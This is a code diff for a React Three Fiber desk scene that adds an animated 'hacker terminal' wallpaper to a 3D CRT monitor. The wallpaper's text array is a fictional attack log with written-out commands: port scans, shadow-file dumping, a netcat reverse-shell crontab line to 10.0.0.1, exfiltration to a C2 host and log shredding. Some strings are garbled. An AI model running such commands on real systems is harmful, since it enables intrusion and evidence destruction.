@@ -1,6 +1,6 @@
 import { useRef, useMemo } from 'react'
 import { useFrame, useThree } from '@react-three/fiber'
-import { RoundedBox, useGLTF } from '@react-three/drei'
+import { RoundedBox, useGLTF, useTexture } from '@react-three/drei'
 import * as THREE from 'three'
 import gsap from 'gsap'
 
@@ -338,7 +338,280 @@ function CRTMonitor({ position, rotation = [0,0,0], screenColor, screenContent, 
     </group>
   )
 } 
+
+
+// image wallpaper
+
+// function KaliWallpaper() {
+//   const texture = useTexture('/vecteezy_old-green-tv-screen-showing-text-live-broadcast-appearing-in_72747679.mp4')
+//   return (
+//     <group>
+//       {/* Wallpaper plane — sits just in front of screen glass */}
+//       <mesh position={[0, 0.04, 0.272]}>
+//         <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
+//         <meshStandardMaterial
+//           map={texture}
+//           roughness={0.05}
+//           toneMapped={false}
+//           emissiveMap={texture}
+//           emissive="#ffffff"
+//           emissiveIntensity={0.4}
+//         />
+//       </mesh>
+//       <pointLight position={[0, 0.04, 0.36]} intensity={0.6} color="#1a88cc" distance={1.6} decay={2} />
+//     </group>
+//   )
+// }
+
+
+// video wallpaper
+
+// function KaliWallpaper() {
+//   const videoTexture = useMemo(() => {
+//     const video = document.createElement('video')
+//     video.src = '/stock-footage-computer-programming-code-green-text-background-scrolling-programming-security-hacking-code-data.mp4'
+//     video.loop = true
+//     video.muted = true
+//     video.autoplay = true
+//     video.playsInline = true
+//     video.play()
+//     const texture = new THREE.VideoTexture(video)
+//     texture.minFilter = THREE.LinearFilter
+//     texture.magFilter = THREE.LinearFilter
+//     texture.format = THREE.RGBAFormat
+//     return texture
+//   }, [])
+
+//   return (
+//     <group>
+//       <mesh position={[0, 0.04, 0.272]}>
+//         <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
+//         <meshStandardMaterial
+//           map={videoTexture}
+//           emissiveMap={videoTexture}
+//           emissive="#ffffff"
+//           emissiveIntensity={0.5}
+//           toneMapped={false}
+//           roughness={0.05}
+//         />
+//       </mesh>
+//       <pointLight position={[0, 0.04, 0.36]} intensity={0.6} color="#1a88cc" distance={1.6} decay={2} />
+//     </group>
+//   )
+// }
+
+
+// live typing wallpaper 
  
+function KaliWallpaper() {
+  const canvasTexture = useMemo(() => {
+    const canvas = document.createElement('canvas')
+    canvas.width = 800
+    canvas.height = 500
+    const ctx = canvas.getContext('2d')
+
+    const lines = []
+    const maxLines = 28
+    const logMessages = [
+      '> INITIALIZING EXPLOIT FRAMEWORK v4.2.1',
+      '> TARGET: 192.168.1.1 | PORT SCAN RUNNING...',
+      '[ ** ] nmap -sV -sC -p- 192.168.1.1 --open',
+      '[ OK ] 22/tcp  open  ssh     OpenSSH 8.2 [ OK ] 22/tcp  open  ssh OpenSSH 8.2 [ OK ] 22/tcp  open  ssh OpenSSH 8.2',
+      '[ OK ] 80/tcp  open  http    Apache/2.4.41 [ OK ] 22/tcp  open  ssh     OpenSSH 8.2',
+      '[ OK ] 443/tcp open  https   nginx 1.18.0',
+      '[ !! ] 3306/tcp open mysql   MySQL 5.7.32 [ OK ] 22/tcp  open  ssh',
+      '[ !! ] 6379/tcp open redis   Redis 6.0.9[ OK ] 22/tcp  open  ssh     OpenSSH 8.2[ OK ] 22/tcp  open  ',
+      '[ OK ] 8080/tcp open  http   Tomcat/9.0.45[ OK ] 22/tcp  open  ssh     OpenSSH 8.2',
+      '──────────────────────────────────────────────',
+      '> LOADING MODULE: exploit/multi/handler',
+      '[ ** ] Checking for CVE-2021-44228 (Log4Shell)',
+      '[ OK ] TARGET IS VULNERABLE — PROCEEDING',
+      '[ ** ] Generating payload: linux/x64/meterpreter',
+      '[ OK ] PAYLOAD SIZE: 207 bytes',
+      '[ ** ] Sending exploit to 192.168.1.1:8080...',
+      '[ OK ] SESSION 1 OPENED (192.168.1.1:4444)',
+      '──────────────────────────────────────────────',
+      'meterpreter > getuid',
+      'Server username: www-data',
+      'meterpreter > sysinfo',
+      'Computer : ubuntu-server-prod',
+      'OS       : Linux 5.4.0-74-generic',
+      'Arch     : x64 | Meterpreter : x64/linux',
+      '[ !! ] 6379/tcp open redis Redis 6.0.9[ OK ] 22/tcp open ssh OpenSSH 8.2[ OK ] 22/tcp  open  ',
+      '[ OK ] 8080/tcp open  http Tomcat/9.0.45[ OK ] 22/tcp open ssh OpenSSH 8.2',
+      'meterpreter > getuid',
+      'Server username: root',
+      '──────────────────────────────────────────────',
+      '> DUMPING /etc/shadow...',
+      'root:$6$xyz$AbCdEfGhIjKlMnOpQrStUvWxYz1234:19000:0:99999:7:::',
+      'ubuntu:$6$abc$ZyXwVuTsRqPoNmLkJiHgFeDcBa9876:19000:0:99999:7:::',
+      'mysql:$6$def$MnOpQrStUvWxYzAbCdEfGh5678:19000:0:99999:7:::',
+      '[ OK ] HASHES SAVED → /tmp/.loot/shadow.txt',
+      '──────────────────────────────────────────────',
+      '> RUNNING HASHCAT ON CAPTURED HASHES...',
+      '[ ** ] hashcat -m 1800 shadow.txt rockyou.txt',
+      '[ OK ] root     : toor1234!',
+      '[ OK ] ubuntu   : ubuntu@123',
+      '[ OK ] mysql    : mysql_p@sssdfsdfsdfsdfdsferwteemr nter t erg er ge',
+      '──────────────────────────────────────────────',
+      '> ESTABLISHING PERSISTENCE...',
+      '[ ** ] Writing crontab backdoor...',
+      '[ OK ] @reboot nc -e /bin/bash 10.0.0.1 9999',
+      '[ ** ] Adding SSH authorized_key...',
+      '[ OK ] KEY INJECTED → /root/.ssh/authorized_keysegregerg neg niuehrg8io ien    oiu ho ednvi ijncvxo uinwsojno iusdho',
+      '[ ** ] Creating hidden user: _sysupdate',
+      '[ OK ] USER CREATED | SUDO RIGHTS GRANTED',
+      '──────────────────────────────────────────────',
+      'root:$6$xyz$AbCdEfGhIjKlMnOpQrStUvWxYz1234:19000:0:99999:7:::',
+      'ubuntu:$6$abc$ZyXwVuTsRqPoNmLkJiHgFeDcBa9876:19000:0:99999:7:::',
+      'mysql:$6$def$MnOpQrStUvWxYzAbCdEfGh5678:19000:0:99999:7:::',
+      '[ OK ] HASHES SAVED → /tmp/.loot/shadow.txt',
+      '[ OK ] 192.168.1.20 — fileserver01',
+      '[ OK ] 192.168.1.45 — workstation-CEO  OK ] 192.168.1.45 — workstation-CEO',
+      '[ OK ] 192.168.1.67 — workstation-CFO',
+      '[ ** ] Pivoting through 192.168.1.1...',
+      '[ OK ] 192.168.1.10 — COMPROMISED',
+      '[ OK ] 192.168.1.45 — COMPROMISED OK ] 192.168.1.45 — workstation-CEO',
+      '──────────────────────────────────────────────',
+      '> EXFILTRATING SENSITIVE DATA...',
+      '[ ** ] find / -name "*.pdf" -size +100k 2>/dev/null',
+      '[ OK ] /home/ceo/Documents/Q4_Revenue.pdf',
+      '[ OK ] /home/cfo/Finance/budget_2024.xlsx',
+      '[ OK ]  /var/www/html/config/database.php/var/www/html/config/database.php/var/www/html/config/database.php',
+      '[ OK ] /etc/nginx/ssl/server.key',
+      '[ ** ] Uploading to C2: 10.0.0.1:443...',
+      '[ OK ] 847MB EXFILTRATED SUCCESSFULLY',
+      '──────────────────────────────────────────────',
+      '> COVERING TRACKS...',
+      '[ ** ] shred -vfz /var/log/auth.log[ *REINITIALIZING SCAN ON NEW SUBNET.ll',
+      '[ ** ] shred -vfz /var/log/syslog',
+      '[ ** ] history -c && unset HISTFILE[ ** REINITIALIZING SCAN ON NEW SUBNET.size +100k 2>/dev/null[ ** ] find / -name "*.pdf" -size +100k 2>/dev/null',
+      '[ OK ] ALL LOGS CLEARED',
+      '[ ** ] Removing temp files...[ ** ] find / -name "*.pdf" ',
+      '[ OK ] /tmp/.loot DELETED',
+      '──────────────────────────────────────────────',
+      '>>> OPERATION COMPLETE — GHOST MODE ACTIVE <<<',
+      '──────────────────────────────────────────────',
+      '> REINITIALIZING SCAN ON NEW SUBNET...',
+      '[ ** ] nmap -sn 10.10.10.0/24',
+      '[ OK ] 23 hosts up | 977 hosts down',
+    ]
+
+    let lineIndex = 0
+    let charIndex = 0
+    let currentLine = ''
+    let lastTime = 0
+    let charDelay = 18
+
+    function getLineColor(line) {
+      if (line.includes('[ OK ]')) return '#00ff41'
+      if (line.includes('[ ** ]')) return '#ffdd00'
+      if (line.includes('[ !! ]')) return '#ff6600'
+      if (line.includes('>>>')) return '#ff4444'
+      if (line.includes('──')) return '#1a4a1a'
+      if (line.startsWith('>')) return '#00ccff'
+      if (line.startsWith('meterpreter')) return '#ff88ff'
+      if (line.startsWith('root:') || line.startsWith('ubuntu:') || line.startsWith('mysql:')) return '#ff8844'
+      if (line.includes('COMPROMISED') || line.includes('COMPLETE') || line.includes('GRANTED')) return '#ff4444'
+      return '#00cc33'
+    }
+
+    function drawFrame(timestamp) {
+      ctx.fillStyle = '#050d05'
+      ctx.fillRect(0, 0, 800, 500)
+
+      // CRT scanlines
+      for (let y = 0; y < 500; y += 3) {
+        ctx.fillStyle = 'rgba(0,0,0,0.22)'
+        ctx.fillRect(0, y, 800, 1)
+      }
+
+      // Typing logic — variable speed for drama
+      const msg = logMessages[lineIndex % logMessages.length]
+      charDelay = 0
+
+      // Type multiple characters per frame
+      for (let tick = 0; tick < 8; tick++) {
+        const m = logMessages[lineIndex % logMessages.length]
+        if (charIndex < m.length) {
+          currentLine += m[charIndex]
+          charIndex++
+        } else {
+          lines.push({ text: currentLine, color: getLineColor(currentLine) })
+          if (lines.length > maxLines) lines.shift()
+          currentLine = ''
+          charIndex = 0
+          lineIndex++
+        }
+      }
+
+      // Draw completed lines
+      const lineH = 17
+      const startY = 16
+      ctx.font = 'bold 12px "Courier New", monospace'
+
+      lines.forEach((line, i) => {
+        const alpha = 0.35 + (i / lines.length) * 0.65
+        ctx.globalAlpha = alpha
+        ctx.fillStyle = line.color
+        ctx.fillText(line.text, 8, startY + i * lineH)
+      })
+
+      // Current typing line
+      if (currentLine !== '') {
+        const col = getLineColor(currentLine)
+        ctx.globalAlpha = 1.0
+        ctx.fillStyle = col
+        ctx.font = 'bold 12px "Courier New", monospace'
+        const ty = startY + lines.length * lineH
+        ctx.fillText(currentLine, 8, ty)
+
+        // Blinking block cursor
+        if (Math.floor(timestamp / 450) % 2 === 0) {
+          const cx = 8 + ctx.measureText(currentLine).width + 2
+          ctx.fillStyle = '#00ff41'
+          ctx.fillRect(cx, ty - 12, 8, 14)
+        }
+      }
+
+      ctx.globalAlpha = 1.0
+
+      // Subtle green center glow
+      const grd = ctx.createRadialGradient(400, 250, 60, 400, 250, 320)
+      grd.addColorStop(0, 'rgba(0,255,65,0.045)')
+      grd.addColorStop(1, 'rgba(0,0,0,0)')
+      ctx.fillStyle = grd
+      ctx.fillRect(0, 0, 800, 500)
+
+      texture.needsUpdate = true
+      requestAnimationFrame(drawFrame)
+    }
+
+    const texture = new THREE.CanvasTexture(canvas)
+    requestAnimationFrame(drawFrame)
+    return texture
+  }, [])
+
+  return (
+    <group>
+      <mesh position={[0, 0.04, 0.272]}>
+        <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
+        <meshStandardMaterial
+          map={canvasTexture}
+          emissiveMap={canvasTexture}
+          emissive="#001100"
+          emissiveIntensity={0.7}
+          toneMapped={false}
+          roughness={0.05}
+        />
+      </mesh>
+      <pointLight position={[0, 0.04, 0.36]} intensity={1.0} color="#00ff41" distance={2.2} decay={2} />
+    </group>
+  )
+}
+
+
+
 // ── Desk Setup (retro reference style) ────────────────────────────────────
 function DeskSetup({ onSelect }) {
   return (
@@ -384,17 +657,9 @@ function DeskSetup({ onSelect }) {
           <meshStandardMaterial color="#0d1117" roughness={0.05} />
         </mesh>
         {/* Screen content */}
-        <group position={[0, 0.08, 0.275]}>
-          <mesh position={[0, 0, 0.001]}><boxGeometry args={[0.62, 0.41, 0.001]} /><meshStandardMaterial color="#0d1a3a" roughness={0.05} /></mesh>
-          <mesh position={[0, 0.02, 0.003]}><boxGeometry args={[0.18, 0.32, 0.001]} /><meshStandardMaterial color="#1a3a88" emissive="#1a3a88" emissiveIntensity={0.5} roughness={0.1} /></mesh>
-          {[0.14, 0.08, 0.02, -0.04, -0.1].map((y, i) => (
-            <mesh key={i} position={[-0.1+(i%2)*0.06, y, 0.005]}>
-              <boxGeometry args={[0.2+(i%3)*0.05, 0.014, 0.001]} />
-              <meshStandardMaterial color="#4488ff" emissive="#4488ff" emissiveIntensity={1.2} roughness={0.1} />
-            </mesh>
-          ))}
-          <pointLight position={[0, 0, 0.15]} intensity={0.5} color="#2244aa" distance={1.4} decay={2} />
-        </group>
+        {/* Real Kali wallpaper texture */}
+        <KaliWallpaper />
+
         {/* Stand */}
         <RoundedBox args={[0.84*0.55, 0.06, 0.5*0.55]} radius={0.02} smoothness={3} position={[0, -0.64/2-0.04, 0]}>
           <meshStandardMaterial color="#c8c4b8" roughness={0.6} />
